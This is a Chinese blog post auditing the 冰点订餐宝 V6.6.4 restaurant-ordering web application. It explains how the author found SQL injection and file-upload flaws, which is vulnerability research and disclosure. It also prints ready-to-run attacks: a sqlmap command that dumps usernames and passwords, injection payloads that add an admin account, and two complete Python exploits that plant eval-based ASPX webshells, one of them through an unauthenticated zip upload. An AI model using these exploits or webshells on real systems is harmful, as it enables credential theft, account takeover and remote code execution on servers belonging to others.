---
title: 代码审计-冰点订餐宝之SQL注入、文件上传到EXP编写
date: 2019-2-28 09:41:29
updated: 2019-2-28 09:41:29
comments: true
categories: 
 - 代码审计
---

### 0x00 序言
在很久很久以前，我有一个梦想

但是，后来我发现我的梦想渐渐没有了

于是，昨天我思考了一晚上

觉得我应该有个梦想的！

### 0x01 漏洞介绍及测试环境
影响版本：冰点订餐宝 V6.6.4.19044

修复方式：删除对应漏洞文件

程序前端使用.net语言编写，调用的后端全部使用C#编写，使用审计工具是扫描不到任何东西的，采用的方式是手动搜索关键词，可是苦了我这个只会Python基础的垃圾。

所有的验证文件都在bin目录下的dll文件，需要反编译才能对代码进行分析。

测试环境（保留至少一周）：http://16f782g826.iok.la/dr/Index.aspx

### 0x02 SQL注入漏洞
搜索select 发现有两个文件包含SQL语句，SQL注入漏洞在以下两个文件：
```code
DC\PurchaseAdd.ashx

DC\PurchaseModify.ashx
```

这两个地方过滤的是大写的SQL关键词，使用随机大小写脚本可以绕过。

直接打开这两个文件进行分析，这两个注入漏洞的防护文件是一样的，这里只分析其中一个文件：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr01.png)

| 行数 | 作用分析 |
|:-----:|:-----:|
|90-98	|一系列的MSSQL操作，涉及的函数有四个：Dt_DR_Human_Manager、GetConnectionString、OpenConnection、clsItem|
|99-100	|执行SQL语句|


在引用文件bin\DiningRoomOnLineDC.Common.dll上查找这四个函数都没发现有SQL过滤，根据漏洞文件的请求信息组成了链接：
```code
http://16f782g826.iok.la/dr/DC/PurchaseAdd.ashx?Method=GetCTList&LoginUserCode=
http://16f782g826.iok.la/dr/DC/PurchaseModify.ashx?Method=GetCTList&LoginUserCode=
```

![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr02.png)

这里就没有什么好说的，直接SQLmap跑一下，payload、权限啥都出来了：

![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr03.png)

在获取表名的时候发现被拦截了：

![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr04.png)

根据拦截的关键字找到了拦截文件bin\DiningRoom.PageLib.dll，这个文件下有个safe_360.cs做了全局过滤，可惜过滤的都是大写的字符：

![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr05.png)
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr06.png)


使用随机大小写字母绕过即可，SQLmap自带了该功能脚本，脚本名字为randomcase.py。

SQLmap完整的验证语句如下，-C后边是用户名和密码两个表：

```code
sqlmap -u "http://16f782g826.iok.la/dr/DC/PurchaseAdd.ashx?Method=GetCTList&LoginUserCode=" --time-sec 1 -v 3 --batch -D DR -T Dt_DR_Human -C P_HumanCode,P_Password --dump --tamper="randomcase.py"
```
#### SQL注入EXP

既然是SQL注入，就直接写注入的EXP吧，不考虑其他的，通过SQL添加一个用户名，用户名为webtest,密码为admin，相信大家都能看懂：
```code
' InSErT InTo dr.dbo.Dt_DR_Human (P_HumanCode,P_Password,P_MayBeLogin) VaLUeS ('webtest','CD175540F41025A9','1'); --
```

测试完成之后把添加的用户名webtest删除：

```code
' DeLEtE FrOm dr.dbo.Dt_DR_Human WhErE P_HumanCode='webtest'; --
```

演示图：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr07.gif)

### 0x03任意文件上传
通过搜索文件上传的关键词，发现一个漏洞在DC/UploadDishImgUP.aspx文件，漏洞链接如下：

```code
http://16f782g826.iok.la/dr/DC/UploadDishImgUP.aspx?DishCode=&DishName=
```

通过引用的文件、类、函数、上传提示信息，确定在bin\DiningRoom.PageLib.dll文件下，的有三个验证上传文件：

```code
DC_UploadDishImgUP.cs
clsUploadFileTypeCheck.cs
UploadFile.cs
```

#### DC_UploadDishImgUP.cs:

![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr08.png)

55-61行代码，从请求中获取DishCode的值、上传文件的扩展名，并上传文件，这里上传成功后，在服务器保存的文件名就是：DishCode的值 + 上传文件的扩展名。

#### clsUploadFileTypeCheck.cs:
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr09.png)

34行代码，从右到左获取文件扩展名，并转换成小写。

31行代码，读取配置文件里边，允许上传的扩展名。

20行代码，判断上传文件的扩展名是否在白名单，不存在返回-1。

#### UploadFile.cs
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr10.png)

40行代码，Request.Files[0] 意思是获取当前请求中被上传的文件。

42-43行代码，调用clsUploadFileTypeCheck.cs文件对上传文件的扩展名进行验证，验证不通过则不保存。

#### 程序验证上传文件的流程
* 第一步
通过DC_UploadDishImgUP.cs上传文件，从请求中获取DishCode的值、上传文件的扩展名，并上传文件，这里上传成功后，在服务器保存的文件名就是：DishCode的值 + 上传文件的扩展名。如DishCode=1，上传的文件名为2.aspx，那么保存的文件就是1.aspx。

* 第二步
通过clsUploadFileTypeCheck.cs，验证文件是否为空，扩展名是否为白名单 。

* 第三步
通过UploadFile.cs文件，从GET请求中获取文件名，根据第二步的验证结果处理文件。


#### 漏洞分析
漏洞出现在第三步，Request.Files获取文件名的方式有问题。

作为一个只会Python基础的垃圾，各大牛逼白帽群提问题，无果。花了半天时间从百度上查找Request.Files的用法，结果Request.Files用法仅仅只是获取文件名，没有其他介绍了，这里通过Request.Files[0]获取上传的文件名，如果获取的是POST请求中的文件名，看起来这里不存在文件上传漏洞。

但实际不是这样的，通过测试，这个方法可以从POST请求中获取文件名，也可以从GET请求中获取文件名，使用键值0获取文件的位置，如果有两个文件名，程序只会获取第一个文件名。
第一步和第三步的验证是分开的，所以可通过可控变量DishCode来设置第三步获取的文件扩展名，然后上传任意文件。

通过对DishCode传入文件名，绕过上传验证：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr11.gif)

#### 文件上传EXP
这里没有任何验证，直接访问链接，通过POST上传文件，那么直接使用请求的POST数据包就可以封装成EXP：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr12.png)

脚本只需3部分组成：

1、漏洞链接

2、CSRF验证值

3、上传文件的数据包

整体代码：

```code
import requests
import sys
import re

# 获取CSRF的值
csrf = '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />'

# 上传文件必须的头部，从上图的数据包提取
headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryQY7B9hyYl0c8HCTJ"}

# 上传文件的数据包
post_data = '''
------WebKitFormBoundaryQY7B9hyYl0c8HCTJ
Content-Disposition: form-data; name="__VIEWSTATE"

{}
------WebKitFormBoundaryQY7B9hyYl0c8HCTJ
Content-Disposition: form-data; name="__VIEWSTATEENCRYPTED"


------WebKitFormBoundaryQY7B9hyYl0c8HCTJ
Content-Disposition: form-data; name="btnOK"


------WebKitFormBoundaryQY7B9hyYl0c8HCTJ
Content-Disposition: form-data; name="FileUpload1"; filename="index.aspx"
Content-Type: application/octet-stream

<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["123"],"unsafe"));%>
------WebKitFormBoundaryQY7B9hyYl0c8HCTJ--
'''

# 从传入的参数获取链接
url = chk_url = sys.argv[1]

# 漏洞链接
payload = '/DC/UploadDishImgUP.aspx?DishCode=quan.png&DishName='
chk_url += payload

content = requests.get(chk_url)
csrf_value = re.findall(csrf, content.text)

# 这里的数据包加上获取的CSRF验证值
content = requests.post(chk_url, headers=headers, data=post_data.format(csrf_value[0]))
# 如果文件上传成功，不会返回弹窗，这里只需要判断alert是否在返回的文件就知道啥哼传的文件是否成功
if 'alert' not in content.text:
    shell = url + '/UploadFile/quan.png.aspx'
    # 验证webshell
    if requests.get(shell).status_code == 200:
        print('Upload success！\nwebshell：{} password：123'.format(shell))
else:
    print('Upload lose！')
```

演示图：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr13.gif)

### 0x04未授权文件上传
时隔半个月，又再一次看这套代码，同事天天吓唬说某数字安全公司说又挖到了啥漏洞，没办法，我们做的是同一个项目，两家公司做的同一个项目…

一直不喜欢挖后端漏洞，但是蚊子腿也是肉啊，然后挖到一个后台文件上传，在编写EXP的过程，这个漏洞又变成了未授权文件上传。

漏洞链接，直接访问是需要登录的：http://16f782g826.iok.la/dr/db/DBRS.aspx

来看代码：

漏洞出现在db\DBRS.aspx文件的引用文件bin\DiningRoom.PageLib.dll的db_DBRS.cs类文件第59-77行代码（）：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr14.png)


第63-66行代码，这里从右到左判断文件扩展名是否是.zip扩展名的，所以不管在前端怎么改，只要扩展名不是.zip的都无法突破这里，函数代码如下（同文件第114-125行代码）：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr15.png)


第69-71行代码，这里主要是通过上一步验证后保存文件，然后解压文件
第72行代码（漏洞所在行），这里是删除上传后的压缩包文件，但是解压后的文件不会删除，那么这里就可以把webshell打包成zip文件，上传后程序会把webshell解压出来，然后删除上传的压缩包，而webshell不会被删除。

来看看上传的数据包：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr16.png)


在编写EXP的过程中，登陆之后的CSRF值一直没办法获取到，要不就是上传跳转到登录页面，然后…把这个值删了，上传成功！就变成未授权文件上传了。

```code
import requests
import sys
import re

url = sys.argv[1]

# 这里还是文件上传的头部，从上传的数据包提取
headers = {"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarywwugP6jAQok20T1v"}
# 上传文件的POST数据包，上传的文件要二进制编码之后放进去，不能Python直接二进制编码，不然上传后的压缩包会出错
post_data = '''
------WebKitFormBoundarywwugP6jAQok20T1v
Content-Disposition: form-data; name="__EVENTTARGET"


------WebKitFormBoundarywwugP6jAQok20T1v
Content-Disposition: form-data; name="__EVENTARGUMENT"


------WebKitFormBoundarywwugP6jAQok20T1v
Content-Disposition: form-data; name="__VIEWSTATE"


------WebKitFormBoundarywwugP6jAQok20T1v
Content-Disposition: form-data; name="__VIEWSTATEENCRYPTED"


------WebKitFormBoundarywwugP6jAQok20T1v
Content-Disposition: form-data; name="FileUpload1"; filename="webshell.zip"
Content-Type: application/zip

PK\x03\x04\n\x00\x00\x00\x00\x00\xa3TtN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00webshell/PK\x03\x04\x14\x00\x00\x00\x08\x00\xa3TtN\xf2k\x8d\x9aW\x00\x00\x00W\x00\x00\x00\x16\x00\x00\x00webshell/webshell.aspx\xb3QuP\x08HLOU\xf0I\xccK/\x052l\x95\xbc\x8a\x93\x8b2\x0bJ\x94T\xedlT\x83R\x8b\x0b\xf2\xf3\x8aS\xf5\xc2\x8b2KR5R\xcb\x12s4\x82R\x0bKS\x8bK\xf4<KRs\xa3\x95\n\x12\x8b\x8b\xcbS\x94bu\x94J\xf3\x8a\x13\xd3R\x9545\xadU\xed\x00PK\x01\x02\x1f\x00\n\x00\x00\x00\x00\x00\xa3TtN\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00$\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00webshell/\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xbcoZ\xcf\xc5\xde\xd4\x01\xd9\xbdZ\xcf\xc5\xde\xd4\x01\x98c\xca\xc7\xc5\xde\xd4\x01PK\x01\x02\x1f\x00\x14\x00\x00\x00\x08\x00\xa3TtN\xf2k\x8d\x9aW\x00\x00\x00W\x00\x00\x00\x16\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00'\x00\x00\x00webshell/webshell.aspx\n\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\xbcoZ\xcf\xc5\xde\xd4\x01\xbcoZ\xcf\xc5\xde\xd4\x01\xbcoZ\xcf\xc5\xde\xd4\x01PK\x05\x06\x00\x00\x00\x00\x02\x00\x02\x00\xc3\x00\x00\x00\xb2\x00\x00\x00\x00\x00
------WebKitFormBoundarywwugP6jAQok20T1v
Content-Disposition: form-data; name="btnUpload"


------WebKitFormBoundarywwugP6jAQok20T1v--
'''

url_chck = url + '/db/dbrs.aspx'
webshell = url + '/temp/webshell/webshell.aspx'
# 上传文件成功后会返回物理路径，包含bak,判断bak是否在内容里边就知道文件上传成功与否
if '.bak' in requests.post(url_chck, headers=headers, data=post_data).text:
    code = requests.get(webshell)
    if code.status_code == 200:
        print('webshell：{} passwd：passwd'.format(webshell))
```

演示图：
![](https://autoing.netlify.com/source/do/images/codeaudit/codeaudit-dr17.gif)

### 结束
![](https://autoing.netlify.com/source/do/images/joke/jiecao.gif)